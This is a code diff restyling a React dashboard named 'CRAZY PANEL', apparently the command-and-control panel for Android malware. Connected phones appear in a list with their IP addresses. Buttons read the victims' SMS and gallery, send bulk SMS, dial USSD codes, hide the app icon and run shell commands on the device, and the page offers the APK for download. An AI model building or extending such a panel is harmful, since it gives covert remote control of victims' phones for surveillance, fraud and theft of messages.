@@ -3,12 +3,12 @@ import { useState, useEffect, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 
 export default function Dashboard() {
+  const [activeTab, setActiveTab] = useState('Home');
   const [subTab, setSubTab] = useState('Home');
   const [devices, setDevices] = useState<Record<string, any>>({});
   const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
-  const [searchQuery, setSearchQuery] = useState('');
-  const [toast, setToast] = useState<string | null>(null);
   
+  const [toast, setToast] = useState<string | null>(null);
   const [gallery, setGallery] = useState<string[]>([]);
   const [messages, setMessages] = useState<any[]>([]);
   const [perms, setPerms] = useState<any>({});
@@ -42,6 +42,7 @@ export default function Dashboard() {
   }, [selectedDevice]);
 
   const showToast = (m: string) => { setToast(m); setTimeout(() => setToast(null), 3000); };
+  
   const send = (c: string, p: any = {}) => {
     if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
       ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command: c, payload: p }));
@@ -66,61 +67,68 @@ export default function Dashboard() {
       send(c);
     }
   };
-  const logout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; router.push('/login'); };
 
+  const logout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; router.push('/login'); };
+  
+  const deviceList = Object.values(devices);
   const dev = selectedDevice ? devices[selectedDevice] || {} : {};
-  const list = Object.values(devices).filter((d: any) => d.device_id?.toLowerCase().includes(searchQuery.toLowerCase()) || d.model?.toLowerCase().includes(searchQuery.toLowerCase()));
 
   return (
-    <div className="min-h-screen bg-[#0B0C10] text-white flex flex-col md:flex-row font-sans">
-      {toast && <div className="fixed top-4 left-1/2 -translate-x-1/2 z-50 bg-[#1A1B23] border border-purple-500 px-6 py-3 rounded-lg shadow-lg text-sm">{toast}</div>}
-      
-      {/* SIDEBAR */}
-      <aside className="w-full md:w-80 bg-[#1A1B23] border-r border-gray-800 flex flex-col h-[40vh] md:h-screen">
-        <div className="p-4 border-b border-gray-800">
-          <div className="flex justify-between items-center mb-4">
-            <h1 className="text-lg font-bold text-purple-500">CRAZY PANEL</h1>
-            <button onClick={logout} className="text-xs text-red-400 border border-red-900 px-2 py-1 rounded">Logout</button>
-          </div>
-          <input type="text" placeholder="Search Device ID/Model..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="w-full bg-[#0B0C10] border border-gray-700 rounded p-2 text-xs focus:border-purple-500 outline-none" />
-          <div className="flex justify-between text-xs text-gray-400 mt-3"><span>Connected:</span><span className="bg-purple-900 px-2 rounded-full">{Object.keys(devices).length}</span></div>
-        </div>
-        <div className="flex-1 overflow-y-auto p-2 space-y-1">
-          {list.length === 0 ? <div className="text-center text-gray-500 text-xs mt-10">Waiting for devices...</div> : 
-            list.map((d: any) => (
-              <button key={d.device_id} onClick={() => { setSelectedDevice(d.device_id); setSubTab('Home'); }} className={`w-full text-left p-3 rounded-lg border text-xs ${selectedDevice === d.device_id ? 'bg-purple-900/30 border-purple-500' : 'border-transparent hover:bg-gray-800'}`}>
-                <div className="flex justify-between mb-1"><span className="font-bold truncate">{d.model || 'Unknown'}</span><span className="text-green-400">Online</span></div>
-                <div className="text-gray-400 font-mono text-[10px]">{d.device_id}</div>
-              </button>
-            ))
-          }
-        </div>
-        <div className="p-4 border-t border-gray-800"><a href="/crazy-onxy-MDM/app-debug.apk" download className="block text-center text-xs font-bold bg-purple-600 py-2 rounded hover:bg-purple-500">⬇ Download APK</a></div>
-      </aside>
+    <div className="min-h-screen bg-[#0B0C10] text-white font-sans pb-10">
+      {toast && <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-[#1A1B23] border border-purple-500 px-6 py-3 rounded-lg shadow-lg text-sm">{toast}</div>}
 
-      {/* MAIN CONTENT */}
-      <main className="flex-1 flex flex-col h-[60vh] md:h-screen overflow-hidden">
+      {/* HEADER (Purana Style) */}
+      <header className="flex justify-between items-center p-4 border-b border-gray-800 bg-[#0B0C10]">
+        <div className="flex items-center gap-3">
+          <div className="w-10 h-10 rounded-full bg-purple-600/20 border border-purple-500 flex items-center justify-center text-xl text-purple-400">👤</div>
+          <div>
+            <h1 className="font-bold text-lg text-purple-500 tracking-wide">CRAZY PANEL</h1>
+            <p className="text-xs text-gray-400">Web Admin</p>
+          </div>
+        </div>
+        
+        <div className="flex items-center gap-3">
+          {/* Device Selector Dropdown (Kyunki sidebar hata diya hai) */}
+          {deviceList.length > 0 && (
+            <select 
+              onChange={(e) => setSelectedDevice(e.target.value)} 
+              value={selectedDevice || ''} 
+              className="bg-[#1A1B23] border border-purple-800 text-sm p-2 rounded-lg outline-none text-purple-200"
+            >
+              {deviceList.map((d: any) => (
+                <option key={d.device_id} value={d.device_id}>{d.model || 'Unknown'} ({d.device_id.slice(0,6)})</option>
+              ))}
+            </select>
+          )}
+          <a href="/crazy-onxy-MDM/app-debug.apk" download className="hidden md:block bg-[#1A1B23] border border-purple-600 hover:bg-purple-900 text-white px-4 py-1.5 rounded-lg font-bold text-sm transition">⬇ APK</a>
+          <button onClick={logout} className="text-xs text-red-400 border border-red-900 px-3 py-1.5 rounded-lg hover:bg-red-900 transition">Logout</button>
+        </div>
+      </header>
+
+      {/* TOP NAVIGATION (Purana Style) */}
+      <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm overflow-x-auto bg-[#0B0C10]">
+        {['Home', 'Messages', 'Gallery', 'Permissions', 'Terminal'].map(tab => (
+          <button key={tab} onClick={() => {setActiveTab(tab); setSubTab(tab);}} className={`pb-2 whitespace-nowrap transition-colors ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400 hover:text-gray-200'}`}>{tab === 'Messages' ? 'Messages' : tab}</button>
+        ))}
+      </nav>
+
+      <main className="p-4 max-w-7xl mx-auto">
         {selectedDevice ? (
-          <div className="flex-1 overflow-y-auto p-4 md:p-6">
-            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
-              <h2 className="text-xl font-bold mb-4">{dev.model || 'Device'} <span className="text-xs bg-green-900 text-green-400 px-2 py-0.5 rounded ml-2">Live</span></h2>
-              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
-                <div><span className="text-gray-500 text-xs block">IP Address</span> <span className="text-blue-400">{dev.ip || 'N/A'}</span></div>
-                <div><span className="text-gray-500 text-xs block">Android</span> {dev.android || 'N/A'}</div>
-                <div><span className="text-gray-500 text-xs block">Battery</span> <span className="text-green-400">{dev.battery ? `${dev.battery}%` : 'N/A'}</span></div>
-                <div><span className="text-gray-500 text-xs block">Status</span> 🟢 Heartbeating</div>
+          <>
+            {/* DEVICE INFO CARD (Purana Style) */}
+            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6 relative overflow-hidden">
+              <h2 className="text-xl font-bold mb-4 flex items-center gap-2">{dev.model || 'Unknown'} <span className="text-xs bg-green-900/50 border border-green-700 text-green-400 px-2 py-0.5 rounded">Live</span></h2>
+              <div className="grid grid-cols-2 md:grid-cols-4 gap-y-4 gap-x-8 text-sm">
+                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">ID</span> <span className="text-gray-200">{selectedDevice}</span></div>
+                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">IP Address</span> <span className="text-blue-400">{dev.ip || 'N/A'}</span></div>
+                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">Android</span> <span className="text-gray-200">{dev.android || 'N/A'}</span></div>
+                <div className="flex justify-between border-b border-gray-800/50 pb-2"><span className="text-gray-400">Battery</span> <span className="text-green-400">{dev.battery ? `${dev.battery}%` : 'N/A'}</span></div>
               </div>
             </div>
 
-            <nav className="flex gap-4 md:gap-6 mb-6 border-b border-gray-800 pb-2 overflow-x-auto text-sm">
-              {['Home', 'Messages', 'Gallery', 'Permissions', 'Terminal'].map(t => (
-                <button key={t} onClick={() => setSubTab(t)} className={`pb-2 px-2 ${subTab === t ? 'border-b-2 border-purple-500 font-bold' : 'text-gray-400'}`}>{t}</button>
-              ))}
-            </nav>
-
-            {/* 10 BUTTONS GRID */}
+            {/* TABS CONTENT */}
             {subTab === 'Home' && (
-              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+              <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8">
                 {[
                   {l:'Check Online', i:'📡', c:'CHECK_ONLINE'}, {l:'GET SMS', i:'📥', c:'GET_SMS'},
                   {l:'Bulk SMS', i:'✉️', c:'BULK_SMS'}, {l:'Send SMS', i:'📤', c:'SEND_SMS'},
@@ -128,7 +136,7 @@ export default function Dashboard() {
                   {l:'Dial USSD', i:'🔢', c:'DIAL_USSD'}, {l:'Hide Icon', i:'🕵️', c:'HIDE_ICON'},
                   {l:'Dev Settings', i:'⚙️', c:'OPEN_DEVELOPER_SETTINGS'}, {l:'Battery Settings', i:'🔋', c:'OPEN_BATTERY_SETTINGS'}
                 ].map((b,i) => (
-                  <button key={i} onClick={() => handleAction(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center gap-2 transition group">
+                  <button key={i} onClick={() => handleAction(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center justify-center gap-2 transition group">
                     <span className="text-2xl group-hover:scale-110 transition">{b.i}</span>
                     <span className="text-xs font-semibold text-gray-300 text-center">{b.l}</span>
                   </button>
@@ -138,7 +146,7 @@ export default function Dashboard() {
 
             {subTab === 'Messages' && (
               <div className="space-y-4">
-                <button onClick={() => send('GET_SMS')} className="bg-purple-600 px-4 py-2 rounded text-sm font-bold">Fetch Messages</button>
+                <button onClick={() => send('GET_SMS')} className="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded text-sm font-bold">Fetch Messages</button>
                 {messages.length === 0 ? <div className="text-gray-500 text-sm">No messages.</div> : messages.map((m, i) => (
                   <div key={i} className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800 text-sm">
                     <div className="flex justify-between text-xs text-gray-400 mb-2"><span>{m.address}</span><span>{m.date}</span></div>
@@ -163,7 +171,7 @@ export default function Dashboard() {
 
             {subTab === 'Permissions' && (
               <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 max-w-2xl">
-                <div className="flex justify-between mb-4"><h3 className="font-bold">Live Permissions</h3><button onClick={() => send('GET_PERMISSIONS')} className="bg-gray-700 px-3 py-1 text-xs rounded">Fetch</button></div>
+                <div className="flex justify-between mb-4"><h3 className="font-bold">Live Permissions</h3><button onClick={() => send('GET_PERMISSIONS')} className="bg-gray-700 px-3 py-1 text-xs rounded hover:bg-gray-600">Fetch</button></div>
                 {Object.keys(perms).length === 0 ? <div className="text-gray-500 text-sm">Click Fetch.</div> : Object.entries(perms).map(([k, v]: any) => (
                   <div key={k} className="flex justify-between text-sm border-b border-gray-800 py-2"><span>{k}</span><span className={v ? 'text-green-400' : 'text-red-400'}>{v ? '🟢 Allowed' : '🔴 Denied'}</span></div>
                 ))}
@@ -172,12 +180,16 @@ export default function Dashboard() {
 
             {subTab === 'Terminal' && (
               <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
-                <div className="flex gap-2 mb-4"><input type="text" value={cmd} onChange={e => setCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-[#0B0C10] border border-gray-700 rounded p-2 w-full font-mono text-sm outline-none" /><button onClick={() => send('EXECUTE_SHELL', {command: cmd})} className="bg-green-600 px-4 py-2 rounded text-sm font-bold">Run</button></div>
+                <div className="flex gap-2 mb-4"><input type="text" value={cmd} onChange={e => setCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-[#0B0C10] border border-gray-700 rounded p-2 w-full font-mono text-sm outline-none focus:border-purple-500" /><button onClick={() => send('EXECUTE_SHELL', {command: cmd})} className="bg-green-600 hover:bg-green-500 px-4 py-2 rounded text-sm font-bold">Run</button></div>
                 <pre className="bg-[#0B0C10] p-4 rounded text-green-400 text-xs font-mono h-64 overflow-y-auto border border-gray-800">{out}</pre>
               </div>
             )}
+          </>
+        ) : (
+          <div className="text-center text-gray-500 mt-20 animate-pulse text-lg">
+            Waiting for device connection...
           </div>
-        ) : <div className="flex-1 flex items-center justify-center text-gray-500 text-sm">Select a device to manage.</div>}
+        )}
       </main>
     </div>
   );
